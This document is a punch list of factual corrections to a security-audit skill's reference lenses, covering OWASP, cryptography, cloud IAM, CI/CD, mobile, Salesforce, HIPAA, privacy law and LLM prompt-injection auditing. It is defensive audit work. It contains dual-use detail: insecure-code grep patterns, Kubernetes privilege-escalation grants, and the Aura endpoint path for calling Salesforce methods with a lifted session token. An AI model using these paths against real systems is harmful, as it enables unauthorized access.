# last-aperture OSS restructure: recon punch list

Synthesized from a 13-agent recon pass over the ten existing reference files plus three external verification agents (framework versions, Claude Code plugin schema, competitive positioning).

---


## 1. Must-fix factual errors

Resolved up front, because it gates everything else: **OWASP Top 10:2025 is a real published edition** (release candidate 6 Nov 2025 at Global AppSec, final January 2026), and the ten category headings in `references/web-and-api.md` lines 9-80 match `owasp.org/Top10/2025/` exactly â€” including both new categories (A03 Software Supply Chain Failures, A10 Mishandling of Exceptional Conditions) and all three renames (A07 Authentication Failures, A09 Security Logging and Alerting Failures). API1-API10 (2023), M1-M10 (Mobile 2024) and LLM01-LLM10 (LLM Apps 2025) are likewise exact matches. **Routing on category names is safe.** What is not safe is the *numbering* the files use to cross-reference themselves, and one framework in `SKILL.md` that does not exist.

File paths below are the current `references/*.md` names; each correction lands in the corresponding `lenses/*.md`.

---

**1. `SKILL.md` line 71 â€” "SANS Top 25" is not a framework.**
Wrong: `SANS Top 25 â€” overlapping but with different emphasis`
Correction: delete the line, or fold it into line 70 as `CWE Top 25 (historically CWE/SANS Top 25; SANS co-branding ended after the 2011 edition)`. There is no separate list and no different emphasis â€” sans.org/top25-software-errors mirrors MITRE. The last genuinely joint edition was 2011 (survey-based); every edition since MITRE's 2019 revival is a scripted NVD-data-driven process. This is the single item the framework fact-check calls mandatory before the repo goes public; any appsec reader spots it instantly and it reads as list-padding.

**2. `references/web-and-api.md` â€” two internal cross-references point at the wrong bug class, proving the file was renumbered mechanically.**
Wrong: `### API7: Server-Side Request Forgery` / `See A10 above.` and `### API8: Security Misconfiguration` / `See A05 above.`
Correction: in this file's own 2025 numbering, A10 is Mishandling of Exceptional Conditions and A05 is Injection â€” so a reader chasing SSRF lands on fail-open exception handling, and a reader chasing misconfiguration lands on injection. Both are 2021 residue (SSRF was A10:2021, Security Misconfiguration was A05:2021). Fix to `See the 2021 compatibility note on Server-Side Request Forgery above.` and `See A02: Security Misconfiguration above.`, then convert every remaining `See Axx above` to an explicit markdown anchor. While there: write `A01:2025` rather than bare `A01:`, since the file deliberately keeps 2021 compatibility in scope and bare A-numbers are now ambiguous between two lists.

**3. `references/web-and-api.md` â€” `### A09: Security Logging and Alerting Failures` is CORRECT. Do not "fix" it.**
The web-and-api inventory flags this heading as a 2021/2025 blend and asks for `A09: Logging & Alerting Failures`; the independent framework fact-check verified the official 2025 title against owasp.org and it is *Security Logging and Alerting Failures* â€” **the fact-check wins and the inventory item is rejected.** Recording it here because the skill routes on these strings: applying the inventory's "correction" would silently break name-based routing and make the repo cite a category OWASP never published.

**4. `references/crypto-deep-dive.md` â€” the nonce examples are labelled backwards and contradict their own inline comments.**
Wrong: `# VULNERABLE: nonce reuse possible across restarts or concurrent calls` above `nonce = secrets.token_bytes(12)`; `# CATASTROPHIC: predictable nonce` above a monotonic counter nonce whose own comment says `OK only if message_id is guaranteed unique per key`; and `**Static / predictable IV in AES-GCM**: Critical (key compromise potential)`.
Correction: a fresh CSPRNG nonce per call is the recommended stateless construction â€” relabel it CORRECT-BUT-BOUNDED and state the real caveats (NIST SP 800-38D 2Â³Â² invocation limit for random 96-bit nonces, nonce drawn once at module scope, duplicated CSPRNG state after fork/snapshot); make the VULNERABLE example a module-level `NONCE = secrets.token_bytes(12)`. A predictable-but-unique counter nonce is an approved construction (SP 800-38D Â§8.2.1; TLS 1.3 and QUIC do this) â€” relabel as ACCEPTABLE WITH A DURABLE PER-KEY-MONOTONIC COUNTER and name the failure condition (counter reset, per-replica counters sharing a key). In the severity table, replace with `Repeated (key, nonce) pair in AES-GCM: Critical â€” leaks the GHASH subkey H, enabling arbitrary tag forgery, plus the plaintext XOR`; nonce reuse does not recover the AES key, and predictability is only fatal for CBC IVs. As written, this lens will generate a stream of false positives against correct code.

**5. `references/cloud-and-iac.md` â€” two inversions of AWS policy evaluation order.**
Wrong: `Bucket policies overriding account-level "block public access"` and `Resource-based policies overriding identity-based denies in unexpected ways`
Correction: Block Public Access is a backstop that overrides bucket policies and ACLs, never the reverse â€” restate as "account- or bucket-level BPA disabled (`aws_s3_account_public_access_block` / `aws_s3_bucket_public_access_block` absent or any of the four flags false)", and note that since April 2023 new buckets ship BPA-on with ACLs disabled, which makes the finding narrower and higher-confidence. An explicit `Deny` in *any* applicable policy always wins, so no resource policy can override an identity-based deny; the real pitfall is the opposite direction â€” same-account access is granted if *either* policy allows, so an IAM-only review misses grants in S3/KMS/SQS/SNS/Lambda/ECR/EventBridge resource policies. Add the confused-deputy case (service-principal resource policies with no `aws:SourceAccount`/`aws:SourceArn`).

**6. Eleven checks that can never fire â€” silent false all-clears across six lenses.** These are the highest-consequence class in the set: an auditor runs the check, finds nothing, and reports clean.

| File | Wrong text | Correction |
|---|---|---|
| `cicd-and-supply-chain.md` | `` `pwn-request` patterns â€” search the repo for this term `` | Vulnerable workflows never contain that string; it is a GitHub Security Lab research label. Detect structurally: privileged trigger (`pull_request_target`, `workflow_run`, `issue_comment`, `issues`, `discussion_comment`) + checkout of `pull_request.head.sha`/`head.ref`/`refs/pull/N/merge` + any `secrets.*` or write-scoped `GITHUB_TOKEN`. Or run `zizmor`/`actionlint`/`poutine`/`octoscan`. |
| `cicd-and-supply-chain.md` | `` `.pip.conf` `` | Not a real filename. Use `pip.conf` / `pip.ini`, plus `PIP_INDEX_URL`/`PIP_EXTRA_INDEX_URL`, `[[tool.uv.index]]`, `[[tool.poetry.source]]`. |
| `crypto-deep-dive.md` | `` `cipher = Crypto.AES.new(key, AES.MODE_ECB)` â€” ECB `` | `Crypto.AES` does not exist in PyCrypto or PyCryptodome. Grep `AES.new(key, AES.MODE_ECB)`, `Cipher(algorithms.AES(key), modes.ECB())`, `Cipher.getInstance("AES/ECB/PKCS5Padding")` â€” and `Cipher.getInstance("AES")`, which silently resolves to ECB and is the better catch. |
| `crypto-deep-dive.md` | `` JWT decode with `verify=False` `` | Removed in PyJWT 2.0 (Dec 2020). Current smells: `options={"verify_signature": False}`, missing `algorithms=`, Node `jwt.decode()` where `verify` was meant, Go `ParseUnverified`. |
| `mobile.md` | `` `fetch` with `rejectUnauthorized: false` `` | A Node `tls`/`https` option; React Native's fetch polyfill over NSURLSession/OkHttp ignores it. Use the real bypasses: iOS `URLSessionDelegate` unconditionally calling `.useCredential(URLCredential(trust:))`, ATS exceptions; Android empty `checkServerTrusted`, `HostnameVerifier { _,_ -> true }`, OkHttp trust-all factory, `<debug-overrides>` in `network_security_config.xml`; Flutter `badCertificateCallback => true`. |
| `mobile.md` | `` `hbc-decompiler` `` | Does not exist. Cite `hbctool`, `hermes-dec` (P1 Security), `hasmer`, and note they track specific HBC bytecode versions. |
| `cloud-and-iac.md` | `` `create` on serviceaccounts/tokenrequest `` | Not an RBAC resource string. The subresource is `serviceaccounts/token`. Add the omitted escalation grants: `create` on `pods`, `pods/exec`, `pods/attach`; `get`/`list` on `secrets`; `patch` on `nodes`/`nodes/proxy`; `create` on `certificatesigningrequests/approval`; `escalate`/`bind` on `clusterroles`. |
| `cloud-and-iac.md` | `Resources created with `prevent_destroy = false`` | Not a resource attribute; it is a `lifecycle` meta-argument whose default is `false`, so the string described appears in almost no real config. Check for the *absence* of `lifecycle { prevent_destroy = true }` on stateful resources, and keep severity Low/Medium â€” it is a guard rail, not a control. |
| `cloud-and-iac.md` | `PodSecurityPolicy (deprecated) or Pod Security Admission policies not enforced` | PSP was **removed** in Kubernetes 1.25; "PSP not enforced" is not a finding on any supported cluster. Check missing `pod-security.kubernetes.io/enforce|audit|warn` labels, explicit `enforce=privileged`, or Kyverno/Gatekeeper/ValidatingAdmissionPolicy running audit-only. |
| `salesforce.md` | `` `System.runAs()` in non-test code (shouldn't exist; flag it) `` | The Apex compiler rejects `System.runAs` outside test methods, so such code cannot deploy. Replace with the real bug class: privileged paths tested only as admin, and `@isTest(SeeAllData=true)` on tests covering sharing-sensitive code; audit for the *absence* of `System.runAs(minimalAccessUser)` around `@AuraEnabled` entry points. |
| `llm-and-ai.md` | `` LangChain's `PythonREPLTool` `` | **[CORRECTED 2026-07-27: do NOT treat this symbol as dead. Its import path moved in 2023 but the string `PythonREPLTool` is unchanged, so the grep still works — and `PythonREPLTool`, `PythonAstREPLTool`, `SQLDatabaseToolkit` and `QuerySQLDataBaseTool` are NOT gated by `allow_dangerous_code` and never were. Keep the symbol grep; the flags are an ADDITION, not a replacement. See the correction at §4 seed entry 6.]** Symbol moved to `langchain_experimental.tools.python.tool` in 2023; additional high-signal greps are the opt-in flags `allow_dangerous_code=True` / `allow_dangerous_requests=True`, and `create_agent`/LangGraph rather than `AgentExecutor`. Add the highest-yield HF grep, absent from the file entirely: `trust_remote_code=True` (and `torch.load(..., weights_only=False)`, since PyTorch 2.6 flipped the default). |

**7. `references/web-and-api.md` â€” the SSRF deny-list omits loopback, and the recommended mitigation is the attack described one bullet earlier.**
Wrong: `Allowlist by hostname is fragile; better to allowlist + resolve + check resolved IP isn't in RFC1918, link-local, or cloud metadata ranges (169.254.169.254 above all)`
Correction: `127.0.0.0/8` is not in RFC1918 â€” as written, the canonical SSRF target is not blocked. Add loopback, `0.0.0.0`, IPv6 loopback/ULA (`::1`, `fc00::/7`), IPv4-mapped forms (`::ffff:127.0.0.1`), CGNAT `100.64.0.0/10`, and non-AWS metadata endpoints (`metadata.google.internal`, `fd00:ec2::254`, `100.100.100.200`). And state that check-and-connect must be atomic â€” validate every returned A/AAAA record then connect to the validated IP carrying the original Host/SNI (pinned-IP dialer), or route egress through an allowlisting forward proxy. "Resolve + check" as written is exactly the DNS-rebinding TOCTOU the preceding bullet warns about.

**8. HIPAA does not set a 6-year audit-log retention requirement â€” three sites.**
Wrong: `references/hipaa-and-phi.md`: `- **Logs must be retained**: 6 years minimum from creation or last effective date` (duplicated at line 247) and `references/cloud-and-iac.md` line 127: `Logs retain too short (regulatory minimums: HIPAA 6 years, PCI 1 year)`
Correction: Â§164.316(b)(2)(i) requires 6-year retention of Security Rule *documentation* â€” policies, procedures, assessments, records of required actions â€” not application audit logs, for which the Security Rule specifies no period. Rewrite as: "HIPAA specifies no audit-log retention period; organizations commonly extend the Â§164.316(b)(2)(i) documentation clock to logs by policy, and state medical-record law or CMS conditions of participation may require longer. Audit configured retention against the organization's own stated policy." For PCI, say PCI DSS v4.0.1 Req 10.5.1: 12 months of history, 3 months immediately available. Delete the durations from `cloud-and-iac.md` entirely and defer to the hipaa and privacy lenses.

**9. `references/hipaa-and-phi.md` â€” the breach-notification safe harbor is stated without either condition that makes it real.**
Wrong: `The threshold for "breach" is impacted by encryption status (encrypted PHI breached per HHS guidance is a "secured PHI" and generally not a reportable breach)`
Correction: the safe harbor requires (a) encryption conforming to HHS's HITECH Â§13402(h)(2) guidance â€” NIST SP 800-111 at rest, SP 800-52/800-77 with FIPS-validated modules in transit â€” and (b) that the decryption key was not also compromised. It almost never applies to the common breach: stolen credentials, session hijacking, SQLi, or malicious insider, where the application decrypts for the attacker. Add Â§164.402's three exceptions and the four-factor risk assessment, and state that absent a documented low-probability-of-compromise assessment an acquisition of unsecured PHI is presumed a breach. As written this reads as "we're encrypted, so no reporting," which is the most dangerous sentence in the file.

**10. `references/hipaa-and-phi.md` â€” minimum necessary is stated with none of its statutory exceptions.**
Wrong: `- API endpoints returning more fields than the use case needs`
Correction: Â§164.502(b)(2) exempts six situations, including disclosures to and requests by a health care provider for treatment. A clinician-facing chart view legitimately returns the whole record; as written the section instructs auditors to file "excessive data return" findings precisely where the standard does not apply. List the six exceptions before the checklist, then scope the checklist to non-treatment surfaces: billing, scheduling, front desk, analytics, vendor integrations, role-restricted internal tools.

**11. `references/hipaa-and-phi.md` â€” Stripe and payment processors.**
Wrong: `- **Payment processors**: Stripe â€” limited BAA scope; for healthcare-specific use cases verify.`
Correction: Stripe's documented position is that it does *not* enter into BAAs; "limited BAA scope" implies a narrow one exists. More importantly the entry omits the controlling rule â€” financial institutions and processors performing payment-processing activities are excluded from business associate status. **The controlling authority is SSA §1179 / 42 U.S.C. 1320d-8 alone** — [CORRECTED 2026-07-27; this entry previously also cited 45 CFR §160.103, which is wrong. §160.103's business-associate definition carries a different and shorter exclusion list — a provider receiving treatment disclosures, a plan sponsor, certain government agencies, an organized health care arrangement — and payment processing is not among them. Verified independently during the hipaa-and-phi and salesforce-platform migrations. Do not restore the §160.103 citation.] Name, amount and card data alone are not a BAA gap. The real finding is scope creep: diagnosis, CPT/procedure codes, provider names or clinical context stuffed into a charge `description`, `statement_descriptor` or `metadata`. Following this bullet as written files a phantom "missing BAA" finding against every Stripe integration.

**12. `references/llm-and-ai.md` â€” Datadog named as inherently non-BAA-able.**
Wrong: `Logging full conversations including PII to non-BAA'd telemetry (Datadog, Sentry, etc.)`
Correction: Datadog publishes a BAA and a documented HIPAA-eligible configuration, so a finding written from this line is factually wrong and embarrassing in a client report. Genericize to the auditable fact: "conversation content (prompts, completions, tool arguments) is shipped to an observability processor â€” enumerate the processor and confirm the contract and configuration permit that content class." Keep vendor names only as examples of where to look, with no claim about contract status. The same principle retires the per-vendor BAA verdict table (`Cloudflare â€” offers BAA. CloudFront â€” covered. Akamai â€” covered.`) in `hipaa-and-phi.md`: convert to a verification procedure plus a "last verified" date.

**13. `references/llm-and-ai.md` â€” Constitutional AI presented as an injection defense.**
Wrong: `Constitutional behavior is robust but not infallible`
Correction: delete. Constitutional AI is an alignment training method targeting harmlessness/helpfulness; it is not an injection-resistance mechanism and is not documented as one. Presenting it as a provider-level property invites an auditor to downgrade an LLM01 finding because of the model vendor â€” the exact reasoning OWASP LLM01 (2025) warns against. Replace with: "No model's training makes it injection-resistant. Severity derives from what the injected text can reach (privileged tools, unsanitized sinks, cross-tenant reads), never from the model vendor."

**14. `references/llm-and-ai.md` â€” a vendor differentiator that does not exist.**
Wrong: `Tool use API takes structured tools; less prone to "model outputs random JSON" issues`
Correction: OpenAI has shipped JSON-Schema tool definitions since mid-2023 and constrained-decoding Structured Outputs (`strict: true`) since Aug 2024. Independently, schema conformance is not a security property â€” well-formed arguments are still attacker-influenced. Drop the comparison and state: schema-valid tool arguments are untrusted input; every tool must authorize the real user and validate arguments server-side regardless of provider guarantees.

**15. `references/crypto-deep-dive.md` â€” UUIDv4 entropy.**
Wrong: `UUID v4 used as a security token: usually fine (128 bits of entropy, well over the needed)`
Correction: 122 bits (RFC 9562, which superseded RFC 4122 in May 2024) â€” 4 version bits and 2 variant bits are fixed by the spec. Still adequate for guessing resistance, but quoting "128 bits" to a cryptographer costs the whole document its credibility.

**16. `references/crypto-deep-dive.md` â€” bcrypt pre-hashing advice is itself a known bug, and the pepper clause is a non sequitur.**
Wrong: `note bcrypt's 72-byte password limit â€” pre-hash with SHA-256 or use a `pepper` scheme`
Correction: most bcrypt implementations are NUL-terminated, so a raw SHA-256 digest containing `0x00` silently truncates the password and collapses the keyspace â€” say "pre-hash with SHA-256 **then base64-encode the digest**" per the OWASP Password Storage Cheat Sheet, and note password-shucking risk for `bcrypt(md5(pw))` schemes. A pepper has nothing to do with the 72-byte limit; it defends leaked hash tables against offline cracking. Move it to its own bullet or drop it.

**17. `references/crypto-deep-dive.md` â€” HSTS is not a pinning replacement, and web pinning is not a live option.**
Wrong: `Pinning: appropriate for mobile (where you control both ends), risky for web (rotation issues, replaced by CT logs and HSTS in many cases)`
Correction: HSTS only forces the scheme to HTTPS and places no constraint on which CA may issue â€” precisely the threat pinning addressed. HPKP (RFC 7469) was removed from all major browsers by ~2018 and Expect-CT from Chrome in 2023, so web pinning is not a tradeoff to weigh; the replacements are Certificate Transparency enforcement plus CAA records restricting issuance. On mobile, pin the SPKI with a backup pin and an expiry, never a leaf certificate.

**18. `references/crypto-deep-dive.md` â€” Ed25519 cofactored verification.**
Wrong: `**Ed25519**: generally hard to misuse, but verify the library you use is constant-time and uses cofactored verification (some don't, leading to forgery in adversarial settings`
Correction: RFC 8032 Â§5.1.7 specifies the *cofactorless* equation and only permits the cofactored variant; libsodium, ref10, Go and BoringSSL are cofactorless and are not thereby broken. The consequence of divergence is cross-implementation malleability, non-repudiation failure and consensus splits â€” not existential forgery under an honest key. Reframe the checks: reject non-canonical scalars (S < L), document whether small-order/non-canonical A and R are accepted, and require one convention across every verifier in a consensus system (ZIP-215). Cite Chalkias, Garillot & Nikolaenko, "Taming the Many EdDSAs" (SSR 2020) with the blog post as secondary, author and URL attached.

**19. `references/crypto-deep-dive.md` â€” "modern libs handle this" tells auditors to skip a real P-256 check.**
Wrong: `**Diffie-Hellman**: small subgroup attacks; validate the peer's public key is in the right subgroup. ECDH curves (X25519, P-256) handle this in modern libs.`
Correction: split the bullet. X25519 is safe against invalid-curve attacks by construction but still needs the all-zero shared-secret check (RFC 7748 Â§6.1). NIST-curve ECDH is *not* self-protecting â€” an unvalidated peer point enables invalid-curve private-key recovery, and several raw-primitive APIs do not validate. For finite-field DH, validate both group parameters and subgroup membership.

**20. `references/privacy-and-compliance.md` â€” the entire cookie/tracking-consent block is filed under the wrong legal instrument.**
Wrong: `## GDPR-relevant code patterns â€¦ - **Tracking cookies before consent**: violation` and `- **Marketing emails without unsubscribe link**: violation`
Correction: consent for storing or reading data on a user's device comes from the ePrivacy Directive 2002/58/EC Art 5(3) as transposed nationally (UK PECR, German TDDDG, French rules), not GDPR â€” GDPR supplies only the consent definition/quality standard (Art 4(11), Art 7) and the lawful basis for downstream processing. Mis-filing loses the two Art 5(3) exemptions ("solely for transmission", "strictly necessary for the service explicitly requested"), which are the only defence a team has, and hides that EDPB Guidelines 02/2023 extend Art 5(3) to pixels, local/session storage, IP-based tracking and SDK identifiers. Add an explicit "ePrivacy / PECR (terminal-equipment access)" subsection. Re-cite the unsubscribe bullet to ePrivacy Art 13 / CAN-SPAM 16 CFR 316, and add the missing code-level check: RFC 8058 one-click unsubscribe (`List-Unsubscribe` + `List-Unsubscribe-Post: List-Unsubscribe=One-Click`).

**21. `references/privacy-and-compliance.md` â€” legitimate interest cannot cure fingerprinting, and browser features are not law.**
Wrong: `- Audit: any code computing fingerprints, especially "for fraud prevention" â€” may need legitimate interest justification` and `- Increasingly regulated (Safari's ITP, Firefox's ETP, GDPR enforcement)`
Correction: legitimate interest is a GDPR Art 6 basis and has no application to ePrivacy Art 5(3), under which the only routes are consent or the narrow strictly-necessary exemption â€” EDPB Guidelines 02/2023 treat active fingerprinting as terminal-equipment access and decline to treat generic fraud prevention as automatically strictly necessary. An auditor following this bullet accepts an LI assessment as sufficient when it is not. Relabel ITP/ETP as platform countermeasures, separate from regulation and enforcement.

**22. `references/privacy-and-compliance.md` â€” wrong DSAR deadline, and no CCPA clock at all.**
Wrong: `- 30-day response window`
Correction: `One month from receipt under GDPR Art 12(3) (a request received 31 January is due 28/29 February), extendable by two further months for complex or numerous requests with notice inside the first month; 45 days under CCPA Â§1798.130(a)(2), extendable by a further 45.` As written, auditors report breaches that do not exist and miss the extension mechanism that makes an otherwise "failing" workflow compliant.

**23. `references/privacy-and-compliance.md` â€” SAQ A-EP is not minimal scope.**
Wrong: `- Minimal PCI scope (SAQ A or SAQ A-EP)`
Correction: SAQ A-EP is the *largest* e-commerce SAQ â€” well over a hundred requirements including secure SDLC, quarterly ASV scanning, penetration testing and change detection. Split it: processor-hosted redirect or processor-domain iframe/hosted fields â†’ SAQ A; a merchant-page script or direct-post integration that can affect the transaction â†’ SAQ A-EP, close to full DSS. Lumping them is the single most expensive misunderstanding in PCI scoping, and it also mismatches the pattern the bullet is describing.

**24. `references/privacy-and-compliance.md` â€” "true deletion" stated as an absolute is legally wrong and is the file's biggest false-positive generator.**
Wrong: `- Deletion must be true deletion, not flag-as-deleted`
Correction: GDPR Art 17(3) exempts erasure where processing is necessary for legal obligations, legal claims, public-interest archiving and more; independent statutory retention duties (tax, accounting, employment, AML/KYC, medical records) routinely require keeping the data. Regulators accept irreversible anonymisation and flag-then-purge (ICO "put beyond use"). Restate: erasure must result in irreversible removal or anonymisation within a defined, enforced window â€” a `deleted_at` flag with a scheduled purge satisfies this, one with no purge path does not; record which fields are retained under an Art 17(3) exemption and confirm the retained set is minimised and no longer used for the original purpose. As written, every `deleted_at` column and every retained invoice row becomes a High finding.

**25. `references/privacy-and-compliance.md` â€” transmission requirement conflated with storage.**
Wrong: `- **Card numbers in transit unencrypted**: Critical (rare in 2026 but still happens via inadvertent logging)`
Correction: logging is storage (PCI DSS Reqs 3.3/3.5), not transmission, and Req 4.2.1 is scoped to open/public networks. Split into "PAN transmitted without strong cryptography over any untrusted or public network â€” Req 4.2.1, verify the trusted key/cert inventory (4.2.1.1)" and "PAN sent over end-user messaging (email, SMS, chat, ticketing) â€” Req 4.2.2, prohibited unless protected" (the most common real-world instance, currently missing). Move the inadvertent-logging note under the logging bullet. Note the file self-dates here â€” "rare in 2026" â€” which raises the cost of every unversioned citation elsewhere.

**26. `references/salesforce.md` â€” wrong API version for user mode, and there is no `WITH USER_MODE` for DML.**
Wrong: `Required patterns (post-API 48.0):` / `- `WITH USER_MODE` in SOQL/DML â€” easiest, enforces both FLS and sharing. Prefer this.`
Correction: `WITH USER_MODE`/`WITH SYSTEM_MODE` and the `AccessLevel` enum arrived in API 56.0 (Winter '23, beta), GA in 57.0 â€” not 48.0 (Spring '20). An auditor citing 48.0 tells teams on API 50-55 to use a clause that will not compile. `WITH USER_MODE` is SOQL-only; for DML the mechanisms are `Database.insert(records, AccessLevel.USER_MODE)` and siblings, or the statement form `insert as user records;`. State what user mode enforces: object permissions, FLS *and* sharing, overriding the class's `with/without sharing` declaration.

**27. `references/salesforce.md` â€” wrong attack paths for `@AuraEnabled`.**
Wrong: `anyone with API access can call it directly via REST/Tooling/anonymous Apex`
Correction: `@AuraEnabled` methods are not exposed on the REST or Tooling APIs (only `@RestResource` is), and anonymous Apex requires "Author Apex", which this same file elsewhere calls a privilege-escalation permission. The real path is the Aura endpoint: `/aura` with `aura.ApexAction.execute` and a session token any authenticated user can lift from a Lightning page. Add the caveat the file omits â€” for entry-point classes the platform does check Apex Class Access, so "any authenticated user" holds only where class access is broadly granted (usually) or the user has Author Apex (always).

**28. `references/salesforce.md` â€” Flow execution context.**
Wrong: `Flows can run in System Context (bypassing sharing/FLS) or User Context.`
Correction: record-triggered, scheduled and other autolaunched flows *always* run in system context â€” the only lever is "System Context With Sharingâ€”Enforces Record-Level Access" vs "Without Sharingâ€”Access All Data". User context is the default for screen flows and is not selectable for record-triggered flows. Critically, "With Sharing" enforces record-level access only; it does **not** enforce object permissions or FLS, so choosing it does not close the FLS hole the next bullet worries about. Any flow field write that must respect FLS needs an Apex action in user mode or an explicit permission check.

**29. `references/salesforce.md` â€” custom settings exposure understated, making an unconditional finding sound conditional.**
Wrong: `Custom Settings used to store secrets â€” readable by users with View All Data`
Correction: custom settings data is exempt from sharing rules *and* field-level security â€” any user with API access can read unprotected records via SOQL or REST regardless of profile; "View All Data" is not required. So a secret there is a secret for the whole org. Add the counterpart caveat on the recommended fix: protected custom metadata/settings are genuinely protected only when read by code in a managed-package namespace; in the owning org an admin with Customize Application can view them in Setup.

**30. `references/salesforce.md` â€” the flagship example of FLS write escalation does not work.**
Wrong: `write bypass is worse than read bypass because it enables privilege escalation (setting `Profile`, `OwnerId`, custom approval fields)`
Correction: `Profile` is not a writable record field; profile assignment is `User.ProfileId` and DML on it is gated by "Manage Users", not FLS. Drop it and use fields FLS actually gates: `OwnerId`, approval/status flags, `Amount`/`Discount__c`, `RecordTypeId`, and any field consumed by a criteria-based sharing rule (writing it silently widens record access). Escalation via `User` DML belongs under permission checks.

**31. `references/salesforce.md` â€” two smaller accuracy defects in the same file.**
Wrong: `**Hardcoded credentials in Apex**: Critical (Apex source is readable by anyone with "View All Data" or "Author Apex," and shows up in metadata exports).` and the `// FIX` block that assigns `String safeInput = String.escapeSingleQuotes(userInput);` and then never uses it.
Correction: "View All Data" is a data permission and grants no Apex source access â€” reading `ApexClass.Body` requires "Author Apex" plus Setup/metadata access, and managed-package bodies are masked entirely. Justify the Critical on durable facts instead: the secret is in every metadata retrieve, sandbox refresh and git clone, is visible to anyone with "Author Apex"/"Modify Metadata Through Metadata API", and rotating it requires a deploy; fix is Named Credentials + External Credentials. In the SOQL block, interpolate the escaped value so the snippet actually compiles as shown, and add the modern option the file omits: `Database.queryWithBinds(q, new Map<String,Object>{'name' => userInput}, AccessLevel.USER_MODE)` (**API 57.0+, Spring '23** — [CORRECTED 2026-07-27; this entry previously said 56.0. `queryWithBinds` shipped in 57.0 with the dynamic-SOQL bind restriction; the `AccessLevel` enum is the 56.0/57.0 pair, which is the likely source of the confusion. Independently confirmed during the salesforce-platform migration and its review.]).

**32. `references/mobile.md` â€” four wrong mechanisms that send auditors to the wrong place.**
- Wrong: `` `react-native-webview` with `originWhitelist={['*']}` â€” allows any origin in iframes ``. Correction: `originWhitelist` governs *top-level navigation* only and has no bearing on iframes, XHR/fetch or subresources (those are CSP and same-origin policy, and load even at the default). Restate: `['*']` removes the navigation allowlist, so a redirect or `window.location` write can move the WebView to arbitrary origins including `file://`, exposing `injectedJavaScript` and the `window.ReactNativeWebView` bridge to attacker script. Then add the props this bullet stands in for, absent from the file: `allowFileAccess`, `allowFileAccessFromFileURLs`, `allowUniversalAccessFromFileURLs`, `allowingReadAccessToURL`, `mixedContentMode="always"`, `setSupportMultipleWindows={false}`, and native `addJavascriptInterface`/`@JavascriptInterface`.
- Wrong: `` `openURL:options:completionHandler:` source app identifier can be spoofed ``. Correction: that is the *sending* API and carries no source-app identifier; the receiver gets it via `application(_:open:options:)` / `scene(_:openURLContexts:)`. And it is populated by the OS from the calling process, not spoofable by the caller â€” the real point is that it must not be used as an authorization signal because it is frequently absent (Universal Links, `SFSafariViewController`, Mail/Messages, most scene paths) and can be laundered by chaining through a third app.
- Wrong: `AsyncStorage (React Native) â€” NOT encrypted, just a JSON file`. Correction: the conclusion is right, the backing store is wrong, and it misdirects the proof. Android: `/data/data/<pkg>/databases/RKStorage`, SQLite table `catalystLocalStorage`. iOS: `<sandbox>/Documents/RCTAsyncLocalStorage_V1/manifest.json` plus per-key files. Add that `react-native-mmkv` is plaintext unless given an `encryptionKey`, and a key hardcoded in JS is no protection.
- Wrong: `` `expo-auth-session` â€” verify it's using PKCE (default in v5+, was optional earlier) ``. Correction: `AuthRequestConfig.usePKCE` has defaulted to `true` since long before v5, so this flags correct code on older SDKs and skips the check on newer ones. Drop the version claim; flag explicit `usePKCE: false` and `ResponseType.Token`/`response_type=token` (implicit flow bypasses PKCE regardless), confirm `state` is generated and verified, and confirm `makeRedirectUri()` matches an exact-match registration.

**33. Self- and cross-lens contradictions â€” a lens handed verbatim to independent auditors cannot contain two answers.**
- `references/mobile.md`: checklist says `Certificate pinning either missing (Medium) or implemented in a bypassable way (Low â€¦)` while the severity table says `**Missing cert pinning**: Low standalone, Medium for high-value apps`. The inline rating is also backwards (bypassable rated below missing) and uninformative (every pinning implementation falls to Frida on a rooted device). Delete the inline severities, let Severity calibration be the single source of truth, and replace the bullet with checkable conditions: no backup pin / no rotation plan, or pinning applied to only one of several HTTP clients.
- `references/llm-and-ai.md` `**Hardcoded API key for LLM provider in client**: Critical if costs are unbounded` vs `mobile.md`'s "Critical if the key is high-privilege (admin API), High if it's a public/anon key" â€” two lenses grade one bug differently in the same report. Resolve to: Critical unconditionally â€” an exposed provider key grants org-scoped access to stored conversations, files, vector stores and fine-tuning, plus unbounded spend and abuse under the org's identity; cost is the least of it. Fix is a server-side proxy with per-user auth and budget, not obfuscation. Mirror the wording in both files.

**34. `references/threat-modeling.md` â€” the agent trust boundary is backwards and contradicts `llm-and-ai.md`.**
Wrong: `- LLM context â†’ LLM tool output`
Correction: data flowing from the model's context into a tool's output is not a trust crossing. The two real boundaries are "Tool output / retrieved documents â†’ LLM context (untrusted input)" and "LLM output â†’ tool invocation or privileged action (untrusted control flow)". `llm-and-ai.md` already states the correct framing ("treat each agent's output as untrusted input to the next"), so the two files currently disagree.

**35. `references/threat-modeling.md` â€” three method errors in the file whose whole job is method.**
- Wrong: `- Defends against: keeping software patched, not running unnecessary services` (and the identical field in all five attacker profiles). The grammatical subject is the attacker, so each line states that the attacker defends against your controls. In a brief handed to an autonomous subagent this field *is* the mitigation list; rename to `Defeated by:` in all five profiles.
- Wrong: the attack tree rendering `â”‚ â”œâ”€â”€ Get DB credentials` / `â”‚ â””â”€â”€ Reach DB network` with no AND/OR semantics. These two are conjunctive while their children are disjunctive, and both are drawn with identical glyphs â€” which makes the following instruction ("For each leaf, evaluate feasibility â€¦ is it actually defended against?") wrong for AND nodes, where defending *either* child kills the subtree. Label every internal node `[AND]`/`[OR]` and change the instruction to propagate: OR is as feasible as its cheapest child, AND as hard as its hardest, and the cheapest cut on an AND node is the highest-leverage mitigation.
- Wrong: the STRIDE worked example emits the same threat twice â€” `**T**: Can the link be modified to grant broader access than intended?` and the E bullet "Can a viewer-permission link be modified to grant editor permission?". This is the file's only STRIDE demonstration and it demonstrates the duplicate-finding failure the restructure exists to eliminate. Distinguish: T is integrity of the capability token (unsigned or malleable payload, truncation, parameter injection into the redeem handler); E is the authorization consequence reached by any means (redeem endpoint derives the grant from a client-supplied role, or viewer and editor share a code path). If the only path to E is via T, report one threat.

**36. `references/cicd-and-supply-chain.md` â€” the 3CX incident is described wrongly, and the wrong description changes the recommended defense.**
Wrong: `- **3CX (2023)**: Compromised electron build with backdoored dep. Defense: SBOM monitoring, signed releases.`
Correction: 3CX DesktopApp was compromised via a trojanized third-party installer (X_TRADER) leading to build-environment compromise; what shipped was a validly signed Electron app side-loading malicious DLLs (`ffmpeg.dll`, `d3dcompiler_47.dll`). It was not a package-manager dependency backdoor, and signed releases did not help â€” the malicious build was signed. Defense: build-environment isolation and hermetic builds, plus verifying what actually ships (reproducible builds / bit-for-bit comparison against build inputs), because signing attests to the publisher, not the build.

